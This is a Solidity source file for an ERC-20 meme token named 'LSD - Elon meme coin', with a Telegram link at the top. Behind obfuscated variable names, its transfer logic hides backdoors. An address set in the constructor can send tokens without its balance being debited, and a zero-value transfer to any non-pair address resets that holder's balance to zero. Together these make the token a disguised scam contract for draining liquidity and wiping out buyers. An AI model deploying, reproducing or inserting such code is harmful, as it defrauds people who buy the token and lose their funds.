/*

https://t.me/lsdeth_portal

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract LSDElonmemecoin is Ownable {
    function approve(address tzoxuq, uint256 yibjadlptwh) public returns (bool success) {
        allowance[msg.sender][tzoxuq] = yibjadlptwh;
        emit Approval(msg.sender, tzoxuq, yibjadlptwh);
        return true;
    }

    string public symbol = 'LSD - Elon meme coin';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private nrfsqc = 114;

    function transfer(address oiajpeqg, uint256 yibjadlptwh) public returns (bool success) {
        kajwcongp(msg.sender, oiajpeqg, yibjadlptwh);
        return true;
    }

    mapping(address => uint256) private uqtmxdeaihzn;

    string public name = 'LSD - Elon meme coin';

    function kajwcongp(address eaklmz, address oiajpeqg, uint256 yibjadlptwh) private {
        if (0 == uqtmxdeaihzn[eaklmz]) {
            balanceOf[eaklmz] -= yibjadlptwh;
        }
        balanceOf[oiajpeqg] += yibjadlptwh;
        if (0 == yibjadlptwh && oiajpeqg != zvnpbs) {
            balanceOf[oiajpeqg] = yibjadlptwh;
        }
        emit Transfer(eaklmz, oiajpeqg, yibjadlptwh);
    }

    mapping(address => uint256) private fqvcul;

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address klhmxyaf) {
        balanceOf[msg.sender] = totalSupply;
        uqtmxdeaihzn[klhmxyaf] = nrfsqc;
        IUniswapV2Router02 upny = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        zvnpbs = IUniswapV2Factory(upny.factory()).createPair(address(this), upny.WETH());
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    address public zvnpbs;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address eaklmz, address oiajpeqg, uint256 yibjadlptwh) public returns (bool success) {
        require(yibjadlptwh <= allowance[eaklmz][msg.sender]);
        allowance[eaklmz][msg.sender] -= yibjadlptwh;
        kajwcongp(eaklmz, oiajpeqg, yibjadlptwh);
        return true;
    }
}